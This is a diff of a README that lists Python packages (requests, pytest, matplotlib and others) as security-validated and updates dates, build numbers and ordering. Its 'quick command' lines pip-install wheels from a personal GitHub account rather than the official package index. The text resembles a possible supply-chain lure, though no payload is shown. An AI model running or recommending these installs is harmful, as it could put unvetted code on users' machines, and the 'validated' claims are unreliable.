@@ -24,10 +24,10 @@ This repository contains Python packages validated through automated security sc
 
 | Package | Version | Validated |
 |---------|---------|-----------|
-| [`matplotlib`](#matplotlib) | `3.10.9` | 2026-06-10 |
-| [`pytest`](#pytest) | `9.0.3` | 2026-06-10 |
 | [`rich`](#rich) | `15.0.0` | 2026-06-10 |
-| [`requests`](#requests) | `2.34.2` | 2026-06-09 |
+| [`requests`](#requests) | `2.34.2` | 2026-06-10 |
+| [`pytest`](#pytest) | `9.0.3` | 2026-06-10 |
+| [`matplotlib`](#matplotlib) | `3.10.9` | 2026-06-10 |
 | [`pyarrow`](#pyarrow) | `24.0.0` | 2026-05-28 |
 
 ## 📦 Available Packages
@@ -448,11 +448,11 @@ pip install https://github.com/bdousa/pythonFeedWindows/releases/download/report
 
 #### `requests`
 - **Latest version:** `2.34.2`
-- **Validated:** 2026-06-09
+- **Validated:** 2026-06-10
 - **Package type:** Universal wheel (Python 3+)
 - **Download wheel:** [download](https://github.com/bdousa/PythonFeed-Update/releases/download/requests-v2.34.2/requests-2.34.2-py3-none-any.whl)
 - **Release notes:** [release](https://github.com/bdousa/PythonFeed-Update/releases/tag/requests-v2.34.2)
-- **Validation run:** [build #27234393697](https://github.com/bdousa/PythonFeed-Update/actions/runs/27234393697)
+- **Validation run:** [build #27291640234](https://github.com/bdousa/PythonFeed-Update/actions/runs/27291640234)
 - **Quick command:**
 ```text
 pip install https://github.com/bdousa/PythonFeed-Update/releases/download/requests-v2.34.2/requests-2.34.2-py3-none-any.whl
@@ -609,6 +609,6 @@ To request validation of a new package:
 2. **Select Category**: Choose '3rd party library approval'
 3. **Approval Process**: Packages typically validated within 3 business days
 
-*Last updated: 2026-06-10 14:55 UTC*
+*Last updated: 2026-06-10 16:55 UTC*
 
 *Powered by Azure DevOps Security Pipeline*
